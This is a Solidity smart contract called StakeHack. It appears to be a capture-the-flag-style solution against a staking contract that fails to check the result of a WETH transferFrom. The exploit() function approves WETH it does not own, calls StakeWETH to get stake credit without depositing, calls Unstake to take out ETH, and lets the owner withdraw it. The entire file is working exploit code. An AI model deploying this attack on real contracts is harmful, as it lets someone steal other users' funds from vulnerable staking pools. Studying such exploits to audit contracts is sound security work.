// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address) external view returns (uint256);
}

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract StakeHack {
    IStake public stake;
    IWETH public weth;
    address public owner;
    
    constructor(address _stake, address _weth) {
        stake = IStake(_stake);
        weth = IWETH(_weth);
        owner = msg.sender;
    }
    
    function exploit() external {
        require(msg.sender == owner, "Only owner");
        
        // First approve the stake contract to spend WETH (even though we don't have any)
        uint256 amount = 1 ether;
        weth.approve(address(stake), amount);
        
        // Call StakeWETH - this will succeed in updating our balance even though transferFrom fails
        bool result = stake.StakeWETH(amount);
        
        // Now we should have 1 ether in UserStake even though we never deposited anything
        uint256 ourStake = stake.UserStake(address(this));
        require(ourStake == amount, "Exploit failed");
        
        // Unstake to get ETH
        stake.Unstake(amount);
    }
    
    function withdrawETH() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // Needed to receive ETH from Unstake
    receive() external payable {}
}